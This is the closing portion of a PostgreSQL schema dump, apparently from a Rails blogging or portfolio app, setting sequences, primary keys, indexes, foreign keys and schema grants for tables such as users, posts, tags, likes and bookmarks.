-- Name: responses_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.responses_id_seq', 1, false);


--
-- Name: social_accounts_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.social_accounts_id_seq', 1, false);


--
-- Name: tag_relationships_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.tag_relationships_id_seq', 32, true);


--
-- Name: taggings_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.taggings_id_seq', 95, true);


--
-- Name: tags_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.tags_id_seq', 22, true);


--
-- Name: users_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gmialtjawlwvvw
--

SELECT pg_catalog.setval('public.users_id_seq', 1, true);


--
-- Name: action_text_highlighted_code_blocks action_text_highlighted_code_blocks_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.action_text_highlighted_code_blocks
    ADD CONSTRAINT action_text_highlighted_code_blocks_pkey PRIMARY KEY (id);


--
-- Name: action_text_rich_texts action_text_rich_texts_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.action_text_rich_texts
    ADD CONSTRAINT action_text_rich_texts_pkey PRIMARY KEY (id);


--
-- Name: active_storage_attachments active_storage_attachments_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.active_storage_attachments
    ADD CONSTRAINT active_storage_attachments_pkey PRIMARY KEY (id);


--
-- Name: active_storage_blobs active_storage_blobs_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.active_storage_blobs
    ADD CONSTRAINT active_storage_blobs_pkey PRIMARY KEY (id);


--
-- Name: active_storage_variant_records active_storage_variant_records_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.active_storage_variant_records
    ADD CONSTRAINT active_storage_variant_records_pkey PRIMARY KEY (id);


--
-- Name: ar_internal_metadata ar_internal_metadata_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.ar_internal_metadata
    ADD CONSTRAINT ar_internal_metadata_pkey PRIMARY KEY (key);


--
-- Name: bookmarks bookmarks_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.bookmarks
    ADD CONSTRAINT bookmarks_pkey PRIMARY KEY (id);


--
-- Name: experiences experiences_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.experiences
    ADD CONSTRAINT experiences_pkey PRIMARY KEY (id);


--
-- Name: friendly_id_slugs friendly_id_slugs_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.friendly_id_slugs
    ADD CONSTRAINT friendly_id_slugs_pkey PRIMARY KEY (id);


--
-- Name: item_images item_images_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.item_images
    ADD CONSTRAINT item_images_pkey PRIMARY KEY (id);


--
-- Name: item_texts item_texts_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.item_texts
    ADD CONSTRAINT item_texts_pkey PRIMARY KEY (id);


--
-- Name: item_twitters item_twitters_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.item_twitters
    ADD CONSTRAINT item_twitters_pkey PRIMARY KEY (id);


--
-- Name: items items_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.items
    ADD CONSTRAINT items_pkey PRIMARY KEY (id);


--
-- Name: likes likes_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.likes
    ADD CONSTRAINT likes_pkey PRIMARY KEY (id);


--
-- Name: posts posts_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.posts
    ADD CONSTRAINT posts_pkey PRIMARY KEY (id);


--
-- Name: projects projects_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.projects
    ADD CONSTRAINT projects_pkey PRIMARY KEY (id);


--
-- Name: responses responses_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.responses
    ADD CONSTRAINT responses_pkey PRIMARY KEY (id);


--
-- Name: schema_migrations schema_migrations_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.schema_migrations
    ADD CONSTRAINT schema_migrations_pkey PRIMARY KEY (version);


--
-- Name: social_accounts social_accounts_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.social_accounts
    ADD CONSTRAINT social_accounts_pkey PRIMARY KEY (id);


--
-- Name: tag_relationships tag_relationships_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.tag_relationships
    ADD CONSTRAINT tag_relationships_pkey PRIMARY KEY (id);


--
-- Name: taggings taggings_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.taggings
    ADD CONSTRAINT taggings_pkey PRIMARY KEY (id);


--
-- Name: tags tags_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.tags
    ADD CONSTRAINT tags_pkey PRIMARY KEY (id);


--
-- Name: users users_pkey; Type: CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.users
    ADD CONSTRAINT users_pkey PRIMARY KEY (id);


--
-- Name: index_action_text_highlighted_code_blocks_on_rich_text_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_action_text_highlighted_code_blocks_on_rich_text_id ON public.action_text_highlighted_code_blocks USING btree (rich_text_id);


--
-- Name: index_action_text_rich_texts_uniqueness; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE UNIQUE INDEX index_action_text_rich_texts_uniqueness ON public.action_text_rich_texts USING btree (record_type, record_id, name);


--
-- Name: index_active_storage_attachments_on_blob_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_active_storage_attachments_on_blob_id ON public.active_storage_attachments USING btree (blob_id);


--
-- Name: index_active_storage_attachments_uniqueness; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE UNIQUE INDEX index_active_storage_attachments_uniqueness ON public.active_storage_attachments USING btree (record_type, record_id, name, blob_id);


--
-- Name: index_active_storage_blobs_on_key; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE UNIQUE INDEX index_active_storage_blobs_on_key ON public.active_storage_blobs USING btree (key);


--
-- Name: index_active_storage_variant_records_uniqueness; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE UNIQUE INDEX index_active_storage_variant_records_uniqueness ON public.active_storage_variant_records USING btree (blob_id, variation_digest);


--
-- Name: index_bookmarks_on_bookmarkable_type_and_bookmarkable_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_bookmarks_on_bookmarkable_type_and_bookmarkable_id ON public.bookmarks USING btree (bookmarkable_type, bookmarkable_id);


--
-- Name: index_bookmarks_on_user_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_bookmarks_on_user_id ON public.bookmarks USING btree (user_id);


--
-- Name: index_experiences_on_user_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_experiences_on_user_id ON public.experiences USING btree (user_id);


--
-- Name: index_friendly_id_slugs_on_slug_and_sluggable_type; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_friendly_id_slugs_on_slug_and_sluggable_type ON public.friendly_id_slugs USING btree (slug, sluggable_type);


--
-- Name: index_friendly_id_slugs_on_slug_and_sluggable_type_and_scope; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE UNIQUE INDEX index_friendly_id_slugs_on_slug_and_sluggable_type_and_scope ON public.friendly_id_slugs USING btree (slug, sluggable_type, scope);


--
-- Name: index_friendly_id_slugs_on_sluggable_type_and_sluggable_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_friendly_id_slugs_on_sluggable_type_and_sluggable_id ON public.friendly_id_slugs USING btree (sluggable_type, sluggable_id);


--
-- Name: index_items_on_post_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_items_on_post_id ON public.items USING btree (post_id);


--
-- Name: index_items_on_target; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_items_on_target ON public.items USING btree (target_type, target_id);


--
-- Name: index_likes_on_likeable_type_and_likeable_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_likes_on_likeable_type_and_likeable_id ON public.likes USING btree (likeable_type, likeable_id);


--
-- Name: index_likes_on_user_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_likes_on_user_id ON public.likes USING btree (user_id);


--
-- Name: index_posts_on_slug; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE UNIQUE INDEX index_posts_on_slug ON public.posts USING btree (slug);


--
-- Name: index_posts_on_user_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_posts_on_user_id ON public.posts USING btree (user_id);


--
-- Name: index_projects_on_user_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_projects_on_user_id ON public.projects USING btree (user_id);


--
-- Name: index_responses_on_post_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_responses_on_post_id ON public.responses USING btree (post_id);


--
-- Name: index_responses_on_user_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_responses_on_user_id ON public.responses USING btree (user_id);


--
-- Name: index_social_accounts_on_user_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_social_accounts_on_user_id ON public.social_accounts USING btree (user_id);


--
-- Name: index_tag_relationships_on_related_tag_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_tag_relationships_on_related_tag_id ON public.tag_relationships USING btree (related_tag_id);


--
-- Name: index_tag_relationships_on_tag_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_tag_relationships_on_tag_id ON public.tag_relationships USING btree (tag_id);


--
-- Name: index_tag_relationships_on_tag_id_and_related_tag_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE UNIQUE INDEX index_tag_relationships_on_tag_id_and_related_tag_id ON public.tag_relationships USING btree (tag_id, related_tag_id);


--
-- Name: index_taggings_on_subject; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_taggings_on_subject ON public.taggings USING btree (subject_type, subject_id);


--
-- Name: index_taggings_on_tag_id; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE INDEX index_taggings_on_tag_id ON public.taggings USING btree (tag_id);


--
-- Name: index_users_on_email; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE UNIQUE INDEX index_users_on_email ON public.users USING btree (email);


--
-- Name: index_users_on_reset_password_token; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE UNIQUE INDEX index_users_on_reset_password_token ON public.users USING btree (reset_password_token);


--
-- Name: index_users_on_slug; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE UNIQUE INDEX index_users_on_slug ON public.users USING btree (slug);


--
-- Name: index_users_on_username; Type: INDEX; Schema: public; Owner: gmialtjawlwvvw
--

CREATE UNIQUE INDEX index_users_on_username ON public.users USING btree (username);


--
-- Name: responses fk_rails_06456afde5; Type: FK CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.responses
    ADD CONSTRAINT fk_rails_06456afde5 FOREIGN KEY (post_id) REFERENCES public.posts(id);


--
-- Name: responses fk_rails_2bd9a0753e; Type: FK CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.responses
    ADD CONSTRAINT fk_rails_2bd9a0753e FOREIGN KEY (user_id) REFERENCES public.users(id);


--
-- Name: experiences fk_rails_2d0e25b521; Type: FK CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.experiences
    ADD CONSTRAINT fk_rails_2d0e25b521 FOREIGN KEY (user_id) REFERENCES public.users(id);


--
-- Name: posts fk_rails_5b5ddfd518; Type: FK CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.posts
    ADD CONSTRAINT fk_rails_5b5ddfd518 FOREIGN KEY (user_id) REFERENCES public.users(id);


--
-- Name: action_text_highlighted_code_blocks fk_rails_6b702c2bbc; Type: FK CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.action_text_highlighted_code_blocks
    ADD CONSTRAINT fk_rails_6b702c2bbc FOREIGN KEY (rich_text_id) REFERENCES public.action_text_rich_texts(id) ON DELETE CASCADE;


--
-- Name: active_storage_variant_records fk_rails_993965df05; Type: FK CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.active_storage_variant_records
    ADD CONSTRAINT fk_rails_993965df05 FOREIGN KEY (blob_id) REFERENCES public.active_storage_blobs(id);


--
-- Name: bookmarks fk_rails_c1ff6fa4ac; Type: FK CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.bookmarks
    ADD CONSTRAINT fk_rails_c1ff6fa4ac FOREIGN KEY (user_id) REFERENCES public.users(id);


--
-- Name: active_storage_attachments fk_rails_c3b3935057; Type: FK CONSTRAINT; Schema: public; Owner: gmialtjawlwvvw
--

ALTER TABLE ONLY public.active_storage_attachments
    ADD CONSTRAINT fk_rails_c3b3935057 FOREIGN KEY (blob_id) REFERENCES public.active_storage_blobs(id);


--
-- Name: SCHEMA public; Type: ACL; Schema: -; Owner: gmialtjawlwvvw
--

REVOKE ALL ON SCHEMA public FROM postgres;
REVOKE ALL ON SCHEMA public FROM PUBLIC;
GRANT ALL ON SCHEMA public TO gmialtjawlwvvw;
GRANT ALL ON SCHEMA public TO PUBLIC;


--
-- Name: LANGUAGE plpgsql; Type: ACL; Schema: -; Owner: postgres
--

GRANT ALL ON LANGUAGE plpgsql TO gmialtjawlwvvw;


--
-- PostgreSQL database dump complete
--

